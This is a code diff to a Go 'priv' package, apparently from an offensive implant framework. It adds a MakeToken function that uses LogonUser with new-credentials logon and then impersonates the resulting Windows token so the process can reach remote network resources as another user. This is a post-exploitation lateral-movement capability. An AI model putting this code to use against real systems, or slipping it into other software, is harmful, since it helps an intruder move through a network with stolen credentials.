@@ -22,7 +22,9 @@ package priv
 
 import (
 	// {{if .Debug}}
+
 	"log"
+
 	// {{end}}
 	"fmt"
 	"os/exec"
@@ -202,6 +204,41 @@ func impersonateUser(username string) (token windows.Token, err error) {
 	windows.RevertToSelf()
 	err = fmt.Errorf("Could not acquire a token belonging to %s", username)
 	return
+}
+
+// MakeToken uses LogonUser to create a new logon session with the supplied username, domain and password.
+// It then impersonates the resulting token to allow access to remote network resources as the specified user.
+func MakeToken(domain string, username string, password string) error {
+	var token windows.Token
+
+	pd, err := windows.UTF16PtrFromString(domain)
+	if err != nil {
+		return err
+	}
+	pu, err := windows.UTF16PtrFromString(username)
+	if err != nil {
+		return err
+	}
+	pp, err := windows.UTF16PtrFromString(password)
+	if err != nil {
+		return err
+	}
+	err = syscalls.LogonUser(pu, pd, pp, syscalls.LOGON32_LOGON_NEW_CREDENTIALS, syscalls.LOGON32_PROVIDER_DEFAULT, &token)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("LogonUser failed: %v\n", err)
+		// {{end}}
+		return err
+	}
+	err = syscalls.ImpersonateLoggedOnUser(token)
+	if err != nil {
+		// {{if .Debug}}
+		log.Println("impersonateLoggedOnUser failed:", err)
+		// {{end}}
+		return err
+	}
+	CurrentToken = token
+	return err
 }
 
 func createRegistryKey(keyPath string) error {
